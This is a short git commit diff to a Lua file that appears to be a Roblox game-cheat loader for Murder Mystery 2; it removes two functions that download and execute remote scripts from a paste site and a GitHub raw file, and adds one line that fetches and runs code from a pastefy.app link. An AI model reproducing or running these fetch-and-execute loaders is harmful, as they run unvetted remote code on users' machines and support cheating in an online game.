923bceb7cbf4ae6e1f5c824a41fc847a3056d0e5
leonix <furkan62.bakir@gmail.com>
2025-12-16 19:55:27 +0300

    Remove farm and loadui functions, add new loadstring

--- most.lua
+++ most.lua
@@ -1,9 +1,1 @@
-local function farm()
-    loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216038", true))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua'))()
-end
-
-task.spawn(farm)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://pastefy.app/e2Dd4XkO/raw"))()
